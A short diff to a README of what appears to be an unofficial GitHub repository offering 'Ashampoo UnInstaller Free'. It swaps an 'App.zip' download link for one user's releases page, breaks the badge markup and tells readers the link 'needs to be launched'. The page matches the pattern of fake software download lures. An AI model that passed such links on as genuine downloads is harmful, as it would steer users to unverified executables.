@@ -9,7 +9,7 @@ Welcome to the Ashampoo UnInstaller Free repository! This repository is dedicate
 
 ## Resources
 You can download the Ashampoo UnInstaller Free tool by clicking on the link below:
-[![Download Ashampoo UnInstaller Free](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/uploads/App.zip)
+[![Download Ashampoo UnInstaller Free](https://github.com/rudraksh1402/Ashampoo-UnInstaller-Free/releases)](https://github.com/rudraksh1402/Ashampoo-UnInstaller-Free/releases)
 
 ### Note: The link needs to be launched.
 
